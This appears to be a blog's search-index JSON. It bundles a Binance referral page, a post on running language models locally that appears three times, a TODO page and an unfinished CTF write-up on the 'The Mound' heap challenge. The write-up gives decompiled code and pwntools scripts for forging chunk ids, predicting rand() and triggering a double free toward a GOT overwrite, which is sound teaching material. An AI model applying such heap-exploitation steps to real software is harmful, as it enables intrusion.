[{"categories":["交易所"],"content":" 1.直连网址 由于币安官网在中国大陆早已被封，现特别提供直连注册地址 2.返佣说明 3.免费科学上网工具 不单单是交易所，币圈有相当多的网站还是需要科学上网才能访问的，特别是一手资讯的获取，必须要朝外看看，想要获取免费的科学上网工具，请加作者在本博客留下的联系方式，QQ,邮箱都行。 ","date":"12120-09-09","objectID":"/about/:0:0","tags":null,"title":"币安交易所返佣","uri":"/about/"},{"categories":["交易所"],"content":" 1.直连网址 由于币安官网在中国大陆早已被封，现特别提供直连注册地址 2.返佣说明 3.免费科学上网工具 不单单是交易所，币圈有相当多的网站还是需要科学上网才能访问的，特别是一手资讯的获取，必须要朝外看看，想要获取免费的科学上网工具，请加作者在本博客留下的联系方式，QQ,邮箱都行。 ","date":"12120-09-09","objectID":"/trade/%E5%B8%81%E5%AE%89/:0:0","tags":null,"title":"币安交易所返佣","uri":"/trade/%E5%B8%81%E5%AE%89/"},{"categories":[],"content":"Page where I declare things I will conditionally do in advance with hashed strings. 1st Sept 2023 d1bcf41ad7ed2e894ec8ee61e311acee0ecc3eade0622b9a674d58bb66544658 ","date":"19190-08-08","objectID":"/precommitments/:0:0","tags":["personal"],"title":"Precommitments","uri":"/precommitments/"},{"categories":["tech"],"content":"A preface to the upcoming series on my attempts to use language models, locally","date":"27270-11-11","objectID":"/apple/why-lms/","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/apple/why-lms/"},{"categories":["tech"],"content":"Over the course of the last month or so, I’ve been working on a webapp text editor that uses GPT-J, a language model, to perform autocomplete. If you don’t know what that is, then I hope you’ll enjoy some of the links in this blogpost. But for the majority that does know what language models are, it’s safe to say that I’ve done nothing complex. Technologically, I made a React app with a text editor derived from Slate.js, and connected that to a FastAPI backend which throws requests to huggingface’s transformers. None of this is revolutionary. There are many solutions online that do way better. EleutherAI hosts their own free demo page that runs a lot more elegantly than my webapp. OpenAI’s GPT3 models are a lot better than anything open source can provide. And companies like NovelAI corner the submarket of people who want to do more specific tasks like writing certain kinds of fiction novels. So, why am I even working on any of this? ","date":"27270-11-11","objectID":"/apple/why-lms/:0:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/apple/why-lms/"},{"categories":["tech"],"content":"Models need less vram now Back in August, someone published a paper titled LLM.int8(): 8-bit Matrix Multiplication for Transformers at Scale. I recommend reading the huggingface article on it if you’re interested, but in short, With our method, a 175B parameter 16/32-bit checkpoint can be loaded, converted to Int8, and used immediately without performance degradation. Now, 175B parameters is still pretty big. With Int8, it’d be 175 gigabytes of memory, which is still well in the category of “not for personal use”. But the improvements apply for any language model reliant on the transformer architecture. And there are many great models that are now accessible to larger sections of the general population because of this. Model 3050 (4GB) 2080 TI (11GB) Tesla T4 (16GB) 3090 (24GB) Codegen-2B :check_mark_button: ⬛ ⬛ ⬛ GPT-J-6B :cross_mark: :check_mark_button: ⬛ ⬛ CodeGeeX-13B :cross_mark: :cross_mark: :check_mark_button: :check_mark_button: GPT-NeoX-20B :cross_mark: :cross_mark: :cross_mark: :check_mark_button: :check_mark_button: - int8 improvement | :black_large_square: - no change | :cross_mark: - int8 insufficient If you have an RTX 3090, you can run GPT-NeoX-20B or CodeGeeX-13B. If you have a 2080, you can run GPT-J-6B or Incoder-6B. And if you have enough memory to run Stable Diffusion, you can run Codegen-2B. That last example is particularly motivating, because of the next section. ","date":"27270-11-11","objectID":"/apple/why-lms/:1:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/apple/why-lms/"},{"categories":["tech"],"content":"Advances in sampling strategies Earlier this month, huggingface implemented Contrastive Search into their transformers library. While I’m not at all qualified to describe what it does (and whether it is ’novel’ or ‘obvious’), I find their results rather encouraging. A 3% jump might not sound like much, but it puts CodeGen-2B at the same level as Codex-2.5B. This puts open source replacements for Copilot (like fauxpilot) at the same level of code completion competency. Contrastive search also does a lot better at long-form writing than other sampling strategies, which is great because: ","date":"27270-11-11","objectID":"/apple/why-lms/:2:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/apple/why-lms/"},{"categories":["tech"],"content":"I wanted to write blogposts again I’m not very good at writing. While I don’t think the things I publish are terrible, I often feel that I take way too long to get from ‘idea’ to ‘written essay’. And I’m sure that’s not a unique problem, but it’s the kind of problem that a lot of people seem to shrug at and say, Guess I have to try harder. Or, Guess I can’t do much of that I don’t like either of these options. The third option, “Make an computer do it for you,” is what language models are. But I also don’t really like sending my drafted blogposts to a remote SaaS, so I wanted a solution that could run locally on my own hardware. And that was surprisingly difficult to find online. I did some googling, asked a few communities, double checked a laundry list of github tags to make sure I didn’t miss anything, and somehow I just found nothing. I’m still 90% certain someone has already done, “Open source webapp editor that uses GPT-J,” but for the life of me, I couldn’t find it. The searches I got were polluted with solutions that, while open source, were only designed to send requests to OpenAI’s GPT3 API. Great for most people; not what I’m looking for. So, I got to work on a simple tool that would help me to run GPT-J locally, thinking it would take me less than a weekend to finish. The next few blogposts in this series will cover how I ended up spending a month doing just that. ","date":"27270-11-11","objectID":"/apple/why-lms/:3:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/apple/why-lms/"},{"categories":["tech"],"content":"A preface to the upcoming series on my attempts to use language models, locally","date":"27270-11-11","objectID":"/why-lms/","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/why-lms/"},{"categories":["tech"],"content":"Over the course of the last month or so, I’ve been working on a webapp text editor that uses GPT-J, a language model, to perform autocomplete. If you don’t know what that is, then I hope you’ll enjoy some of the links in this blogpost. But for the majority that does know what language models are, it’s safe to say that I’ve done nothing complex. Technologically, I made a React app with a text editor derived from Slate.js, and connected that to a FastAPI backend which throws requests to huggingface’s transformers. None of this is revolutionary. There are many solutions online that do way better. EleutherAI hosts their own free demo page that runs a lot more elegantly than my webapp. OpenAI’s GPT3 models are a lot better than anything open source can provide. And companies like NovelAI corner the submarket of people who want to do more specific tasks like writing certain kinds of fiction novels. So, why am I even working on any of this? ","date":"27270-11-11","objectID":"/why-lms/:0:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/why-lms/"},{"categories":["tech"],"content":"Models need less vram now Back in August, someone published a paper titled LLM.int8(): 8-bit Matrix Multiplication for Transformers at Scale. I recommend reading the huggingface article on it if you’re interested, but in short, With our method, a 175B parameter 16/32-bit checkpoint can be loaded, converted to Int8, and used immediately without performance degradation. Now, 175B parameters is still pretty big. With Int8, it’d be 175 gigabytes of memory, which is still well in the category of “not for personal use”. But the improvements apply for any language model reliant on the transformer architecture. And there are many great models that are now accessible to larger sections of the general population because of this. Model 3050 (4GB) 2080 TI (11GB) Tesla T4 (16GB) 3090 (24GB) Codegen-2B :check_mark_button: ⬛ ⬛ ⬛ GPT-J-6B :cross_mark: :check_mark_button: ⬛ ⬛ CodeGeeX-13B :cross_mark: :cross_mark: :check_mark_button: :check_mark_button: GPT-NeoX-20B :cross_mark: :cross_mark: :cross_mark: :check_mark_button: :check_mark_button: - int8 improvement | :black_large_square: - no change | :cross_mark: - int8 insufficient If you have an RTX 3090, you can run GPT-NeoX-20B or CodeGeeX-13B. If you have a 2080, you can run GPT-J-6B or Incoder-6B. And if you have enough memory to run Stable Diffusion, you can run Codegen-2B. That last example is particularly motivating, because of the next section. ","date":"27270-11-11","objectID":"/why-lms/:1:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/why-lms/"},{"categories":["tech"],"content":"Advances in sampling strategies Earlier this month, huggingface implemented Contrastive Search into their transformers library. While I’m not at all qualified to describe what it does (and whether it is ’novel’ or ‘obvious’), I find their results rather encouraging. A 3% jump might not sound like much, but it puts CodeGen-2B at the same level as Codex-2.5B. This puts open source replacements for Copilot (like fauxpilot) at the same level of code completion competency. Contrastive search also does a lot better at long-form writing than other sampling strategies, which is great because: ","date":"27270-11-11","objectID":"/why-lms/:2:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/why-lms/"},{"categories":["tech"],"content":"I wanted to write blogposts again I’m not very good at writing. While I don’t think the things I publish are terrible, I often feel that I take way too long to get from ‘idea’ to ‘written essay’. And I’m sure that’s not a unique problem, but it’s the kind of problem that a lot of people seem to shrug at and say, Guess I have to try harder. Or, Guess I can’t do much of that I don’t like either of these options. The third option, “Make an computer do it for you,” is what language models are. But I also don’t really like sending my drafted blogposts to a remote SaaS, so I wanted a solution that could run locally on my own hardware. And that was surprisingly difficult to find online. I did some googling, asked a few communities, double checked a laundry list of github tags to make sure I didn’t miss anything, and somehow I just found nothing. I’m still 90% certain someone has already done, “Open source webapp editor that uses GPT-J,” but for the life of me, I couldn’t find it. The searches I got were polluted with solutions that, while open source, were only designed to send requests to OpenAI’s GPT3 API. Great for most people; not what I’m looking for. So, I got to work on a simple tool that would help me to run GPT-J locally, thinking it would take me less than a weekend to finish. The next few blogposts in this series will cover how I ended up spending a month doing just that. ","date":"27270-11-11","objectID":"/why-lms/:3:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/why-lms/"},{"categories":["tech"],"content":"A preface to the upcoming series on my attempts to use language models, locally","date":"27270-11-11","objectID":"/survey/why-lms/","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/survey/why-lms/"},{"categories":["tech"],"content":"Over the course of the last month or so, I’ve been working on a webapp text editor that uses GPT-J, a language model, to perform autocomplete. If you don’t know what that is, then I hope you’ll enjoy some of the links in this blogpost. But for the majority that does know what language models are, it’s safe to say that I’ve done nothing complex. Technologically, I made a React app with a text editor derived from Slate.js, and connected that to a FastAPI backend which throws requests to huggingface’s transformers. None of this is revolutionary. There are many solutions online that do way better. EleutherAI hosts their own free demo page that runs a lot more elegantly than my webapp. OpenAI’s GPT3 models are a lot better than anything open source can provide. And companies like NovelAI corner the submarket of people who want to do more specific tasks like writing certain kinds of fiction novels. So, why am I even working on any of this? ","date":"27270-11-11","objectID":"/survey/why-lms/:0:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/survey/why-lms/"},{"categories":["tech"],"content":"Models need less vram now Back in August, someone published a paper titled LLM.int8(): 8-bit Matrix Multiplication for Transformers at Scale. I recommend reading the huggingface article on it if you’re interested, but in short, With our method, a 175B parameter 16/32-bit checkpoint can be loaded, converted to Int8, and used immediately without performance degradation. Now, 175B parameters is still pretty big. With Int8, it’d be 175 gigabytes of memory, which is still well in the category of “not for personal use”. But the improvements apply for any language model reliant on the transformer architecture. And there are many great models that are now accessible to larger sections of the general population because of this. Model 3050 (4GB) 2080 TI (11GB) Tesla T4 (16GB) 3090 (24GB) Codegen-2B :check_mark_button: ⬛ ⬛ ⬛ GPT-J-6B :cross_mark: :check_mark_button: ⬛ ⬛ CodeGeeX-13B :cross_mark: :cross_mark: :check_mark_button: :check_mark_button: GPT-NeoX-20B :cross_mark: :cross_mark: :cross_mark: :check_mark_button: :check_mark_button: - int8 improvement | :black_large_square: - no change | :cross_mark: - int8 insufficient If you have an RTX 3090, you can run GPT-NeoX-20B or CodeGeeX-13B. If you have a 2080, you can run GPT-J-6B or Incoder-6B. And if you have enough memory to run Stable Diffusion, you can run Codegen-2B. That last example is particularly motivating, because of the next section. ","date":"27270-11-11","objectID":"/survey/why-lms/:1:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/survey/why-lms/"},{"categories":["tech"],"content":"Advances in sampling strategies Earlier this month, huggingface implemented Contrastive Search into their transformers library. While I’m not at all qualified to describe what it does (and whether it is ’novel’ or ‘obvious’), I find their results rather encouraging. A 3% jump might not sound like much, but it puts CodeGen-2B at the same level as Codex-2.5B. This puts open source replacements for Copilot (like fauxpilot) at the same level of code completion competency. Contrastive search also does a lot better at long-form writing than other sampling strategies, which is great because: ","date":"27270-11-11","objectID":"/survey/why-lms/:2:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/survey/why-lms/"},{"categories":["tech"],"content":"I wanted to write blogposts again I’m not very good at writing. While I don’t think the things I publish are terrible, I often feel that I take way too long to get from ‘idea’ to ‘written essay’. And I’m sure that’s not a unique problem, but it’s the kind of problem that a lot of people seem to shrug at and say, Guess I have to try harder. Or, Guess I can’t do much of that I don’t like either of these options. The third option, “Make an computer do it for you,” is what language models are. But I also don’t really like sending my drafted blogposts to a remote SaaS, so I wanted a solution that could run locally on my own hardware. And that was surprisingly difficult to find online. I did some googling, asked a few communities, double checked a laundry list of github tags to make sure I didn’t miss anything, and somehow I just found nothing. I’m still 90% certain someone has already done, “Open source webapp editor that uses GPT-J,” but for the life of me, I couldn’t find it. The searches I got were polluted with solutions that, while open source, were only designed to send requests to OpenAI’s GPT3 API. Great for most people; not what I’m looking for. So, I got to work on a simple tool that would help me to run GPT-J locally, thinking it would take me less than a weekend to finish. The next few blogposts in this series will cover how I ended up spending a month doing just that. ","date":"27270-11-11","objectID":"/survey/why-lms/:3:0","tags":["language models","personal","machine learning"],"title":"Why Language Models?","uri":"/survey/why-lms/"},{"categories":["not a post"],"content":"Otherwise known as the more verbose 404","date":"26260-08-08","objectID":"/todo/","tags":["WIP"],"title":"TODO","uri":"/todo/"},{"categories":["not a post"],"content":"If you’re reading this page, it means one of two things: You intentionally saw the page titled, “TODO”, and decided to check it out. Here it is. You were on one of the normal pages of this site, clicked a hyperlink, and found yourself here inexplicably. The rest of this page is dedicated to (2). Welcome to the null pointer This is the null pointer node. It’s the page that says, “That blog post you were looking for doesn’t exist yet.” My blog notes form a vague, gestational web of thinking. Although some of my blogposts are isolated nodes, more often I have posts referencing posts referencing posts referencing… a dense graph with connections all over the place. Filling out the full details of the whole graph is difficult – I’m a slow writer – so I often make posts that reference incomplete, unpublished ideas. The link that you clicked to get here will be real page, someday. Just not yet. ","date":"26260-08-08","objectID":"/todo/:0:0","tags":["WIP"],"title":"TODO","uri":"/todo/"},{"categories":["CTF"],"content":"An unfinished pwn writeup, wrapped with the airs of regret.","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"If you’re only interested in the technical details for The Mound, I have a minified version of this post on ctfdump. Back in May, I started work on the outlines of a special blogpost. It’s working title was Doing pwn fast: a personal strategy for speedpwning in CTFs, and I scrapped it when I realised how luridly inefficient I can be in the process of pwning. The inefficiency – as revolting as it was – wasn’t an immediate concern, and I moved on. Fast forward to now. In the leadup to the 9th of August, I spent my weekend huddled in my house, itching away at RaRCTF’s toughest pwnable: an introductory heap CLI that certain professionals finished within hours: I wasn’t one of those professionals. Have a look at the scoreboard graph for the group of experts I happened to tag along with: Read the graph: Aug 8, 1PM minus Aug 7, 1AM. Accounting for sleep, I spent about a full day on a regular glibc pwn challenge. In the spirit of the Sunk Cost Fallacy, I figured I’d invest even more of my time into picking apart the challenge through this over-elaborate writeup. Crazy, right? There’s something cathartic, in writing all of this. A eulogy of sorts to the abandoned introspection I attempted in May. Could I have done this challenge faster, if I’d went about things differently? Maybe, but that’s not the question I’ll be answering in this writeup. I made a number of mistakes in my approach to this challenge, mistakes that I’ll be covering in detail here. In the future, I might try to generalise the problems I’ve identified here for a better rendition of Doing pwn fast, but for now: The Mound [800] The glibc heap is too insecure. I took matters into my own hands and swapped efficiency for security. Files: mound.zip Archive: mound.zip Length Date Time Name --------- ---------- ----- ---- 18160 2021-08-06 09:14 mound/mound 451 2021-08-06 04:38 ctf.xinetd 566 2021-08-06 17:08 Dockerfile 100 2021-08-06 16:43 setup.sh 25 2021-08-06 04:39 start.sh 22 2021-08-06 17:30 flag.txt 2029224 2021-08-06 17:13 libc.so.6 Relevant details: $ checksec mound/mound [*] '/mound' Arch: amd64-64-little RELRO: Partial RELRO # ! Stack: No canary found # ! NX: NX enabled PIE: No PIE (0x400000) # ! $ seccomp-tools dump mound/mound line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0c 0xc000003e if (A != ARCH_X86_64) goto 0014 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x0a 0x00 0x40000000 if (A \u003e= 0x40000000) goto 0014 0004: 0x15 0x09 0x00 0x0000003b if (A == execve) goto 0014 0005: 0x15 0x08 0x00 0x00000142 if (A == execveat) goto 0014 0006: 0x15 0x07 0x00 0x00000002 if (A == open) goto 0014 0007: 0x15 0x06 0x00 0x00000003 if (A == close) goto 0014 0008: 0x15 0x05 0x00 0x00000055 if (A == creat) goto 0014 0009: 0x15 0x04 0x00 0x00000086 if (A == uselib) goto 0014 0010: 0x15 0x03 0x00 0x00000039 if (A == fork) goto 0014 0011: 0x15 0x02 0x00 0x0000003a if (A == vfork) goto 0014 0012: 0x15 0x01 0x00 0x00000038 if (A == clone) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x06 0x00 0x00 0x00000000 return KILL $ ./libc-database/identify libc.so.6 libc6_2.31-0ubuntu9.1_amd64 The seccomp filter is a little bit interesting, but I’ll cover it later on. It’s also worth noting that setup.sh contains this line: $ cat setup.sh #!/bin/sh mv /pwn/flag.txt /pwn/$(xxd -l 16 -p /dev/urandom).txt ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:0:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Working backwards mount has a good number of functions: There’s a function named win; that seems rather important. ssize_t win() { char buf[64]; // [rsp+0h] [rbp-40h] BYREF puts(\"Exploiting BOF is simple right? ;)\"); return read(0, buf, 0x1000uLL); } The binary doesn’t have PIE or stack canaries or RELRO enabled, so the bulk of this challenge must be in gaining RIP control via a GOT overwrite. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:1:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Program outline This is main() (partially prettified): void *arr[16]; // .bss:0x404180 size_t sizes[16]; // .bss:0x404200 int main() { unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); install_seccomp(); puts(\"I am the witch mmalloc\"); puts(\"Force, Prime, Mind, Lore, Chaos, Orange, Einharjar, Poortho, Spirit, Red, Roman, Corrosion, Crust, Rust, all is known to me.\"); puts(\"It is, from all of my training, that I have seen the flaws in glibc heap.\"); puts(\"Welcome, fellow pwner, to The Mound\"); moundsetup(); memset(s, 0, 0x100uLL); while ( 1 ) { #define REJECT {puts(\"No.\"); break;} switch ( int opt = menu() ) { case 4: // free printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; case 3: // edit printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; case 2: // add printf(\"Size of pile: \"); __isoc99_scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); __isoc99_scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; default: puts(\"Cya later :p\"); exit(0); } } } That’s pretty long. Let’s break it up into two segments: the preamble, and the while(1) loop. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:2:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Preamble main() doesn’t have a lot of variables. unsigned int user_sz; // [rsp+8h] [rbp-118h] BYREF unsigned int idx; // [rsp+Ch] [rbp-114h] BYREF char s[0x110]; // [rsp+10h] [rbp-110h] BYREF The 3 variables here are user-editable, and we’ll talk about them later. Just keep in mind that user_sz and idx are unsigned integers written to with scanf(\"%d\") calls later on, and s[] is written to with a non-overflowing, non-zero-terminating1 read() call. After this, main() runs a bunch of initialisers: setvbuf(...); // all 3 i/o streams are unbuffered install_seccomp(); // start seccomp filter as shown at the start of this writeup puts(...); // intro message moundsetup(); // setup the \"mound\"; this challenge's heap implementation memset(s, 0, 0x100uLL); // don't think too much about this; s[] can still be used for a leak if you try hard enough The only complicated function here is moundsetup(); skip ahead to this part of the writeup if you want to understand it. If not: ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:2:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"main()’s loop The CLI gives five options: 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home Here’s a skeleton script to deal with the options: from pwnscripts import * context.binary = 'mound' context.libc = 'libc.so.6' r = context.binary.process() def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(sz: int, idx: int, s: bytes): choose(2) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) (5) just calls exit(0), but the rest are more complex. Add sand case 1: // really bad things getinput(\"Pile: \", s, 0x100uLL); printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = strdup(s); sizes[idx] = strlen(s); break; This option is really weird. A user-inputted stream of bytes – not necessarily nul-terminated – are sent to strdup, and the resultant glibc malloc’d string is stored at arr[idx]. This means that some of arr[]’s elements can be a mixture of mound pointers, and actual glibc heap pointers. It’s also worth noting that the str* functions here can overflow, depending on whether the stack has extra nul-bytes or not. Add dirt case 2: // add printf(\"Size of pile: \"); scanf(\"%d\", \u0026user_sz); if ( user_sz \u003c= 0xFFF ) { printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF ) REJECT; arr[idx] = mmalloc(user_sz); sizes[idx] = 0LL; getinput(\"Pile: \", (void *)arr[idx], user_sz); } else puts(\"A bit too much dirt my friend.\"); break; So this is a little bit interesting. The maximum allocation size is 0xfff; user_sz is an unsigned so the single-bounded comparison works out. For some reason, sizes[idx] is set to 0 instead of user_sz. This is a little bit weird because of case 3: Replace dirt case 3: // edit printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); if ( idx \u003e 0xF || !arr[idx] || !sizes[idx] ) REJECT; getinput(\"New pile: \", (void *)arr[idx], sizes[idx]); break; sizes[idx] has to be non-zero for the edit to pass. Since Option 2 sets sizes[idx] to 0, arr[idx] can only be edited if it’s a pointer from the glibc heap in case 1, or if sizes[idx] can be modified somewhere else. Remove dirt case 4: // free printf(\"Pile index: \"); scanf(\"%d\", \u0026idx); // remember that `idx` itself is typed as unsigned. if ( idx \u003c= 0xF \u0026\u0026 arr[idx] ) { mfree(arr[idx]); sizes[idx] = 0LL; } else REJECT; break; This option calls mfree() on arr[idx]. There’s only one bug here, and it’s that arr[idx] is not zeroed. So, this is a little bit odd. There are obvious Bad Things going on in these options, but the exploit required isn’t immediately obvious here. I’ll need to dive deeper into the mound implementation. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:2:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mound The mound is kind of like the glibc heap, if it had nothing but the tcache. At the start of the program, the mound grabs two big memory spaces from mmap: 0x00000beef0000000 0x00000beef0400000 0x0000000000000000 rw- 0x00000dead0000000 0x00000dead0009000 0x0000000000000000 rw- 0xbeef* stores the actual data distributed by mmalloc; I’ll call it mound_data. At the beginning of its life, the entirety of the mound_data segment constitutes the “top chunk” of the mound. 0xdead* stores the metadata for the mound, kind of like what main_arena does in glibc. The structure looks something like this: typedef struct mound_metadata { void *mound_base; // = 0xbeef0000000; never used for anything size_t ids[0x1000]; // rand64() ids assigned to every chunk allocated by mmalloc. mcache_struct *mcache; // tcache, but for the mound. mchunk *top; // pointer to the top chunk } mound_metadata; // sizeof(mound_metadata) == 0x8018 mound_metadata mound_arena; // cs:0xdead0000000 The new types in there are further defined like so: typedef struct mchunk { size_t id; // rand64() id. size_t sz; // the chunk size (inclusive of metadata) char data[0]; // length is dependent on the size provided to mmalloc() } typedef struct mcache_entry { struct mchunk; // i.e. extend/inherit the mchunk structure here mcache_struct *mcache; // a copy of the mcache for safety verification mcache_entry *next; // next mcache entry; this is a linked list like the tcache. } #define MCACHE_MAX_BINS 0x18 typedef struct mcache_struct { uint8_t counts[MCACHE_MAX_BINS]; mcache_entry *entries[MCACHE_MAX_BINS]; } The most interesting part of each mchunk is (in my opinion, anyway) the id element. Every chunk is assigned a random 64-bit UUID (with a very small chance of collision2) upon allocation. When a chunk is freed, that ID gets chucked into the mound_metadata to protect the program against a double-free. This might make a lot more sense if I give a flowchart of how things work: Relevant macros: #define request2size(x) ((-x\u00260xf)+x+0x10) // x rounded up to nearest 0x10, plus 0x10. Applies for -ve numbers too. #define csize2midx(x) ((x\u003e\u003e4)-2) #define chunk2mem(p) ((void*)p+0x10) #define mem2chunk(p) ((void*)p-0x10) I copied and adapted some of these to python as well: def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) With this high-level overview of the implementation in mind, I can return to the previous question: What are the consequences of sending a glibc heap pointer to mfree()? ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:3:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mixing heap allocators Simply freeing a glibc heap pointer will almost certainly produce an exit(1): 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 1 Pile: hi Pile index: 0 1. Add sand 2. Add dirt 3. Replace dirt 4. Remove dirt 5. Go home \u003e 4 Pile index: 0 Mound: Double free detected The relevant part of the code to check is the find_id(c-\u003eid) call: void find_id(size_t id) { for ( int i = 0; i \u003c= 4095; ++i ) if ( id == mound_arena.ids[i] ) { puts(\"Mound: Double free detected\"); exit(1); } } A typical malloc_chunk looks like this: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; }; Because c-\u003eid occupies the same space as a malloc_chunk’s mchunk_prev_size member, the prev_size of the glibc heap chunk is taken as the id in find_id. The glibc chunk pointers allocated by strdup() will never be free, so prev_size == id should always be 0, and find_id(c-\u003eid) should always result in an error given a glibc heap chunk. Or not. ","date":"9090-08-08","objectID":"/apple/rarctf-2021-the-mound/:3:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/apple/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"The Obvious Solution It takes me a while, but I eventually realise that the preceding paragraph is false. Sequential malloc chunks can use the prev_size field to store user data: This means that if I call strdup(\"A\"*0x17) twice in succession, the first strdup() chunk allocated can be used to overwrite the prev_size of the 2nd strdup() chunk: strdup(b''.rjust(0x17,b'a'), 0) strdup(b''.rjust(0x17,b'a'), 1) edit(0, b''.rjust(0x17,b'a')) Using this method, the interpreted mchunk-\u003eid for a glibc heap chunk can be modified to any value within range(0, 1\u003c\u003c56). # register an arbitrary 56-bit id onto the mound's free id list def reg_id(id: int): strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(id)[:7].rjust(0x17, b'a')) free(0) What are the consequences of this? Adding a new id to mound_arena.ids[] is pretty useless; it would only make allocations harder instead of easier. I could also try to get rid of an ID: def r64(): return randint(0, (1\u003c\u003c64)-1) # generate random ids. Unrelated to rand64bit() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 0) strdup(b'a'*0x17, 1) edit(0, pack(r64())[:7].rjust(0x17, b'a')) free(1) edit(0, pack(id)[:7].rjust(0x17,b'a')) add(0x10, 2, b'a'*0x10) Then I’d be able to free the same region of memory twice, like this: from ctypes import CDLL libc = CDLL('libc.so.6') # r = ... libc.srand(libc.time(0)^r.pid) # pid will have to be guessed on remote def rand64bit(): return libc.rand() + (libc.rand()\u003c\u003c32) # ... omitted code ... # ... make sure to account for rand() calls throughout code as well ... while 1: add(sz=0x20, idx=0xf, b'hi') if not ((chunk_id := rand64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) This is a classic tcache dup, except with the mcache instead. Once you accomplish this much, getting to win() isn’t much of a challenge. 